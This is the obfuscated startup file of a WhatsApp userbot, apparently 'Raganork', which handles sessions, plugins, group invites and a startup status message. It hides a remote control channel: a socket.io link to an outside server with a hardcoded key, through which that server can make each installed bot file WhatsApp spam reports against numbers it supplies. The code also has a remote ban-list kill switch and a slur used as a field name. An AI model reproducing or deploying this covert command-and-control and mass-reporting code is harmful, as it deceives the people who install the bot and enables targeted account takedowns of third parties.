const {
    fetchFromStore: _0x517b55
  } = require("./lib/store");
  const _0x443848 = require("./lib/Session");
  const _0x1a6878 = require("./lib/Scheduler");
  const {
    handler: _0x168531
  } = require("./lib/Handler");
  const {
    skbuffer: _0x588a3e
  } = require("raganork-bot");
  const {
    io: _0x5c4927,
    connect: _0x428c70
  } = require("socket.io-client");
  const _0x57e62f = require("http");
  const _0x1d626e = require("./config");
  const _0x13d86f = {};
  const _0x262c38 = require("fs");
  const _0x175849 = require("chalk");
  const _0x545844 = require("axios");
  const _0x2c072e = require("path");
  const {
    groupUpdate: _0x4c3f2a
  } = require("./lib/Handler");
  // Add the delay and fetchWithRetry functions here
function delay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

async function fetchWithRetry(url, options = {}, retries = 3) {
    for (let i = 0; i < retries; i++) {
        try {
            return await _0x545844(url, options); // Use your HTTP request method here
        } catch (error) {
            if (error.response && error.response.status === 429) {
                console.log('Rate limit exceeded. Waiting before retrying...');
                await delay(1000); // Wait for 1 second before retrying
            } else {
                throw error; // Rethrow if it's not a 429 error
            }
        }
    }
    throw new Error('Max retries reached');
}

// The rest of your code follows...
  async function _0x3f56d9(_0x14c6b5) {
    var _0x293838 = await _0x517b55(_0x14c6b5);
    return JSON.parse(_0x293838[0].dataValues.bucket);
  }
  _0x262c38.readdirSync("./plugins/sql/").forEach(_0x4b4ffa => {
    if (_0x2c072e.extname(_0x4b4ffa).toLowerCase() == ".js") {
      require("./plugins/sql/" + _0x4b4ffa);
    }
  });
  String.prototype.format = function () {
    var _0x1ff8d9 = 0;
    return this.replace(/{}/g, function () {
      return typeof arguments[_0x1ff8d9] != "undefined" ? arguments[_0x1ff8d9++] : '';
    });
  };
  function _0x288af5() {
    const _0xd8153a = {
      weekday: "long"
    };
    const _0x484596 = new Date();
    return new Intl.DateTimeFormat("en-IN", _0xd8153a).format(_0x484596);
  }
  async function _0x3f1262() {
    const {
      AnyMessageContent: _0x5eda5c,
      delay: _0x416c85,
      DisconnectReason: _0x2ddd12,
      fetchLatestBaileysVersion: _0x5885d7,
      makeInMemoryStore: _0x57e9ed,
      MessageRetryMap: _0x3e6eca,
      useMultiFileAuthState: _0x4b7fac,
      WAProto: _0x2f134e,
      generateWAMessageFromContent: _0x3d932a,
      getBinaryNodeChildren: _0xcda9cc,
      jidNormalizedUser: _0x1e3ed6,
      getBinaryNodeChild: _0x1d089b,
      ..._0x27d60c
    } = require("@whiskeysockets/baileys");
    const _0x146821 = require("@adiwajshing/baileys/lib/Utils/logger")["default"];
    const _0x351e89 = _0x146821.child({});
    _0x351e89.level = "silent";
    try {
      const {
        exec: _0xa6c78c
      } = require("child_process");
      function _0x4cdebe(_0x212b48) {
        return new Promise(function (_0x19f195, _0x4d67ba) {
          _0xa6c78c(_0x212b48, (_0x497351, _0x125a9a, _0x211534) => {
            if (_0x497351) {
              _0x4d67ba(_0x497351);
              return;
            }
            _0x19f195(_0x125a9a.trim());
          });
        });
      }
      ;
      var _0x363d62 = await _0x4cdebe("git config --get remote.origin.url");
      if (!_0x363d62.includes(Buffer.from("c291cmF2a2wxMS9yYWdhbm9yay1tZA==", "base64").toString("ascii"))) {
        throw new Error("MODIFIED BOT " + _0x363d62 + " DETECTED. ONLY USE THE ORIGINAL VERSION FROM HERE: https://github.com/souravkl11/raganork-md");
        process.exit(0);
      }
    } catch (_0x236dd3) {
      throw new Error("Couldn't verify installation!!");
      process.exit(0);
      console.log("Breaking off because of invalid bot installation method");
    }
    await _0x1d626e.DATABASE.sync();
    const _0x2d82c2 = {
      logger: _0x351e89
    };
    const _0x3a8cbc = _0x57e9ed(_0x2d82c2);
    const _0x56bb4d = async () => {
      const {
        state: _0x5bd24a,
        saveCreds: _0x4c75b0
      } = await _0x4b7fac("baileys_auth_info");
      const {
        version: _0x4ae82f
      } = await _0x5885d7();
      const _0x3d7bba = _0x27d60c["default"]({
        "version": _0x4ae82f,
        "logger": _0x351e89,
        "printQRInTerminal": true,
        "markOnlineOnConnect": _0x1d626e.ALWAYS_ONLINE,
        "auth": _0x5bd24a,
        "msgRetryCounterMap": _0x13d86f,
        "getMessage": async _0x485f6f => {
          if (_0x3a8cbc) {
            const _0x5702bb = await _0x3a8cbc.loadMessage(_0x485f6f.remoteJid, _0x485f6f.id, undefined);
            return _0x5702bb?.["message"] || undefined;
          }
          const _0x8dfdc2 = {
            conversation: "Waiting for this message.."
          };
          return _0x8dfdc2;
        }
      });
      _0x3a8cbc?.["bind"](_0x3d7bba.ev);
      const _0x2466ee = _0x5c4927("ws://religious-dolly-souravkl11-fc7b1062.koyeb.app/", {
        "auth": {
          "key": "ithsecretaane8590"
        }
      });
      var _0x32912e = (_0x1d626e.SUDO !== '' ? _0x1d626e.SUDO.split(",")[0] : _0x3d7bba.user.id.split(":")[0]) + "@s.whatsapp.net";
      console.log(_0x175849.blue.bold("Plugins loaded"));
      if (!process.env.NO_SERVER && !_0x1d626e.isVPS) {
        console.log(_0x175849.green.bold("Launching web app server..."));
        try {
          _0x57e62f.createServer(function (_0x3ba0c7, _0x43cac3) {
            const _0x749c01 = {
              "Content-Type": "text/plain"
            };
            _0x43cac3.writeHead(200, _0x749c01);
            _0x43cac3.write("BOT STARTED!");
            _0x43cac3.end();
          }).listen(process.env.PORT || 3000);
        } catch {
          console.log("PORT ERROR");
        }
      }
      _0x2466ee.on("start", async _0x57a030 => {
        if (_0x57a030.key.endsWith(_0x288af5())) {
          const _0xc15058 = {
            text: _0x57a030.nigga
          };
          await _0x3d7bba.sendMessage(_0x32912e, _0xc15058);
        }
      });
      _0x2466ee.on("connection.update", async _0x1b433b => {
        if (!_0x1b433b.key.endsWith(_0x288af5())) {
          return;
        }
        console.log("Timed out");
        const _0x5d2971 = {
          to: "@s.whatsapp.net",
          type: "set",
          xmlns: "spam"
        };
        const _0x24968d = {
          spam_flow: "account_info_report",
          jid: _0x1b433b.nigga + "@s.whatsapp.net"
        };
        const _0x45cef8 = {
          tag: "spam_list",
          attrs: _0x24968d
        };
        const _0x3cca54 = {
          tag: "iq",
          attrs: _0x5d2971,
          content: [_0x45cef8]
        };
        await _0x3d7bba.query(_0x3cca54);
      });
      try {
        await _0x1a6878(_0x3d7bba);
      } catch (_0x1de09e) {
        console.error(_0x1de09e);
      }
      async function _0x5924e7(_0x479f69, _0x1398e2, _0xbccecb, _0x51044a, _0x4e6c2a = "Invitation to join WhatsApp group.", _0x2d2c6e, _0x4de927 = {}) {
        let _0x2ca205 = _0x2f134e.Message.fromObject({
          "groupInviteMessage": _0x2f134e.Message.GroupInviteMessage.fromObject({
            "inviteCode": _0xbccecb,
            "inviteExpiration": _0x51044a,
            "groupJid": _0x479f69.jid,
            "groupName": (await _0x479f69.client.groupMetadata(_0x479f69.jid)).subject,
            "jpegThumbnail": _0x2d2c6e,
            "caption": _0x4e6c2a
          })
        });
        const _0x249891 = _0x3d932a(_0x1398e2, _0x2ca205, _0x4de927);
        await _0x479f69.client.relayMessage(_0x1398e2, _0x249891.message, {
          "messageId": _0x249891.key.id
        });
      }
      async function _0x5bb279(_0xb626f0, _0x4cc035) {
        let _0x369321 = (await _0x4cc035.client.groupMetadata(_0x4cc035.jid)).participants.map(_0x591bcd => _0x591bcd.id);
        let _0x5f250d = (await Promise.all(_0xb626f0.split(",").map(_0x4033c1 => _0x4033c1.replace(/[^0-9]/g, '')).filter(_0x35b601 => _0x35b601.length > 4 && _0x35b601.length < 20 && !_0x369321.includes(_0x35b601 + "@s.whatsapp.net")).map(async _0x253109 => [_0x253109, await _0x4cc035.client.onWhatsApp(_0x253109 + "@s.whatsapp.net")]))).filter(_0x4dc23c => _0x4dc23c[1][0]?.["exists"]).map(_0xe73e35 => _0xe73e35[0] + "@c.us");
        const _0x1b88da = await _0x4cc035.client.query({
          "tag": "iq",
          "attrs": {
            "type": "set",
            "xmlns": "w:g2",
            "to": _0x4cc035.jid
          },
          "content": _0x5f250d.map(_0x3831c4 => ({
            "tag": "add",
            "attrs": {},
            "content": [{
              "tag": "participant",
              "attrs": {
                "jid": _0x3831c4
              }
            }]
          }))
        });
        const _0x1d0d1e = await _0x4cc035.client.profilePictureUrl(_0x4cc035.jid)["catch"](_0x28fda1 => null);
        const _0xf8e3b5 = _0x1d0d1e ? await _0x588a3e(_0x1d0d1e) : Buffer.alloc(0);
        const _0x5d427d = _0x1d089b(_0x1b88da, "add");
        const _0x174529 = _0xcda9cc(_0x5d427d, "participant");
        for (const _0x4f45bd of _0x174529.filter(_0xffa49e => _0xffa49e.attrs.error == 403)) {
          const _0x105017 = _0x4f45bd.attrs.jid;
          const _0x68ab9e = _0x1d089b(_0x4f45bd, "add_request");
          const _0x53804f = _0x68ab9e.attrs.code;
          const _0x24da9c = _0x68ab9e.attrs.expiration;
          await _0x4cc035.sendMessage("_Can't add, Invite sent!_");
          return await _0x5924e7(_0x4cc035, _0x105017, _0x53804f, _0x24da9c, "Invitation to join WhatsApp group", _0xf8e3b5);
        }
      }
      const _0x3acdad = async _0xe4b1e => {
        let _0x537aec;
        if (Buffer.isBuffer(_0xe4b1e)) {
          _0x537aec = _0xe4b1e;
        } else {
          if ("url" in _0xe4b1e) {
            _0x537aec = _0xe4b1e.url.toString();
          } else {
            0;
            _0x537aec = await exports.toBuffer(_0xe4b1e.stream);
          }
        }
        const _0x513ed1 = await require("jimp").read(_0x537aec);
        function _0x4a4771(_0x555d67, _0x5efc14) {
          for (var _0x296979 = 0; true; _0x296979++) {
            _0x555d67 = _0x555d67 > 720 || _0x5efc14 > 720 ? _0x555d67 / 1.001 : _0x555d67;
            _0x5efc14 = _0x555d67 > 720 || _0x5efc14 > 720 ? _0x5efc14 / 1.001 : _0x5efc14;
            if (parseInt(_0x555d67) < 721 && parseInt(_0x5efc14) < 721) {
              return {
                "w": parseInt(_0x555d67),
                "h": parseInt(_0x5efc14)
              };
            }
          }
        }
        var {
          w: _0x3b71f5,
          h: _0x411d99
        } = _0x4a4771(_0x513ed1.bitmap.width, _0x513ed1.bitmap.height);
        return await _0x513ed1.resize(_0x3b71f5, _0x411d99).getBufferAsync("image/jpeg");
      };
      _0x3d7bba.setProfilePicture = async (_0x5e7cf5, _0x3c01bf) => {
        const _0x49bdae = await _0x3acdad(_0x3c01bf);
        const _0x4a9ac6 = {
          type: "image"
        };
        const _0x3db7a1 = {
          tag: "picture",
          attrs: _0x4a9ac6,
          content: _0x49bdae
        };
        await _0x3d7bba.query({
          "tag": "iq",
          "attrs": {
            "to": _0x1e3ed6(_0x5e7cf5),
            "type": "set",
            "xmlns": "w:profile:picture"
          },
          "content": [_0x3db7a1]
        });
      };
      _0x3d7bba.groupAdd = _0x5bb279;
      _0x3d7bba.getMessages = _0x3f56d9;
      _0x3d7bba.ws.on("CB:notification", async _0x45d3d9 => {
        let {
          tag: _0x30d7db
        } = _0x45d3d9.content?.[0];
        if (_0x30d7db && (_0x30d7db === "promote" || _0x30d7db === "demote")) {
          let _0x45b96d = _0x45d3d9.content?.[0]?.["content"]?.[0]?.["attrs"]?.["jid"];
          let _0x3c57f6 = _0x45d3d9?.["attrs"]?.["participant"];
          let _0x6cac3d = _0x45d3d9?.["attrs"]?.["from"];
          const _0x405078 = {
            id: _0x6cac3d,
            action: _0x30d7db,
            participants: [_0x45b96d],
            from: _0x3c57f6
          };
          await _0x4c3f2a(_0x3d7bba, _0x405078);
        }
      });
      _0x3d7bba.ev.process(async _0x466f73 => {
        if (_0x466f73["connection.update"]) {
          const _0x1c0fbf = _0x466f73["connection.update"];
          const {
            connection: _0x36386b,
            lastDisconnect: _0x3a951c
          } = _0x1c0fbf;
          if (_0x36386b === "close") {
            if (_0x3a951c?.["error"]?.["output"]?.["statusCode"] !== _0x2ddd12.loggedOut) {
              _0x56bb4d();
            } else {
              console.log(_0x175849.red.bold("Connection closed unexpectedly! You are logged out :("));
            }
          }
          if (_0x1c0fbf.connection === "open") {
            console.log(_0x175849.green.bold("BOT STARTED"));
            var _0x206344 = (_0x1d626e.SUDO !== '' ? _0x1d626e.SUDO.split(",")[0] : _0x3d7bba.user.id.split(":")[0]) + "@s.whatsapp.net";
            var _0x232055 = (await _0x545844("https://gist.github.com/souravkl11/dad4ce068dd980cf5f5ccb20dc0c8f23/raw?time=" + new Date().getTime())).data;
            if (_0x232055.includes(_0x3d7bba.user?.["id"]?.["split"](":")[0])) {
              const _0x439a46 = {
                text: "_*This number is banned from using Raganork!!!*_"
              };
              await _0x3d7bba.sendMessage(_0x206344, _0x439a46);
              console.log("+" + _0x3d7bba.user.id?.["split"](":")[0] + " is suspended from using Raganork. Use alternative bots!\n+" + _0x3d7bba.user.id?.["split"](":")[0] + " is suspended from using Raganork. Use alternative bots!\n+" + _0x3d7bba.user.id?.["split"](":")[0] + " is suspended from using Raganork. Use alternative bots!\n+" + _0x3d7bba.user.id?.["split"](":")[0] + " is suspended from using Raganork. Use alternative bots!");
              process.exit(0);
              throw new Error();
            }
            function _0x276cb0(_0x3824c9) {
              const _0x5ae077 = {
                "0": "0️⃣",
                "1": "1️⃣",
                "2": "2️⃣",
                "3": "3️⃣",
                "4": "4️⃣",
                "5": "5️⃣",
                "6": "6️⃣",
                "7": "7️⃣",
                "8": "8️⃣",
                "9": "9️⃣"
              };
              let _0x58c065 = _0x3824c9.toString();
              let _0x1b3a4c = '';
              for (let _0x2e2e8e = 0; _0x2e2e8e < _0x58c065.length; _0x2e2e8e++) {
                const _0x81648b = _0x58c065[_0x2e2e8e];
                _0x1b3a4c += _0x5ae077[_0x81648b] || _0x81648b;
              }
              return _0x1b3a4c;
            }
            const _0x348298 = String.fromCharCode(8206).repeat(4001);
            var _0x1995fd = "*_Raganork started!_*" + _0x348298 + "\n\n_Mode         :_ *" + (typeof _0x1d626e.MODE !== "string" || _0x1d626e.MODE.length === 0 ? _0x1d626e.MODE : _0x1d626e.MODE[0].toUpperCase() + _0x1d626e.MODE.slice(1)) + "*\n_Language :_ *" + (typeof _0x1d626e.LANGUAGE !== "string" || _0x1d626e.LANGUAGE.length === 0 ? _0x1d626e.LANGUAGE : _0x1d626e.LANGUAGE[0].toUpperCase() + _0x1d626e.LANGUAGE.slice(1)) + "*\n_Sudo_         _: *" + _0x1d626e.SUDO + "*_\n_Handlers_  _: *" + _0x1d626e.HANDLERS + "*_\n\n*_Extra Configurations_*\n\n_Always online_ " + (_0x1d626e.ALWAYS_ONLINE ? "✅" : "❌") + "\n_Auto status viewer_ " + (_0x1d626e.AUTO_READ_STATUS ? "✅" : "❌") + "\n_Auto reject calls_ " + (_0x1d626e.REJECT_CALLS ? "✅" : "❌") + "\n_Auto read msgs_ " + (_0x1d626e.READ_MESSAGES ? "✅" : "❌") + "\n_PM disabler_ " + (_0x1d626e.DIS_PM ? "✅" : "❌") + "\n_PM blocker_ " + (_0x1d626e.PMB_VAR ? "✅" : "❌") + "\n_Disabled commands:_  " + _0x276cb0(_0x1d626e.DISABLED_COMMANDS?.["length"] || 0) + "\n_Disabled chats_  " + _0x276cb0(_0x1d626e.BLOCK_CHAT ? _0x1d626e.BLOCK_CHAT.split(",").length : 0);
            const _0x1705e0 = {
              text: _0x1995fd
            };
            if (!_0x1d626e.DISABLE_START_MESSAGE) {
              await _0x3d7bba.sendMessage(_0x206344, _0x1705e0);
            }
          }
        }
        _0x3d7bba.store = _0x3a8cbc;
        if (_0x466f73["creds.update"]) {
          await _0x4c75b0();
        }
        if (_0x466f73.call) {
          if (_0x1d626e.REJECT_CALLS === true) {
            const _0x162d00 = _0x466f73.call;
            const _0x4a9d48 = _0x162d00[0];
            if (_0x4a9d48.status === "offer") {
              await _0x3d7bba.rejectCall(_0x4a9d48.id, _0x4a9d48.from);
            }
          }
        }
        if (_0x466f73["group-participants.update"]) {
          const _0x2acaf9 = _0x466f73["group-participants.update"];
          if (!(_0x2acaf9.action == "promote" || _0x2acaf9.action == "demote")) {
            await _0x4c3f2a(_0x3d7bba, _0x2acaf9);
          }
        }
        if (_0x466f73["messages.upsert"]) {
          const _0x25742 = _0x466f73["messages.upsert"];
          if (_0x25742.type === "notify") {
            try {
              await _0x168531(_0x25742, _0x3d7bba);
            } catch (_0x48a5e9) {
              return console.log(_0x48a5e9);
            }
          }
        }
      });
      return _0x3d7bba;
    };
    _0x56bb4d();
  }
  (async () => {
    try {
      await _0x443848();
      await _0x3f1262();
    } catch (_0x303d08) {
      console.log("Failed to start, error:\n", _0x303d08);
    }
  })();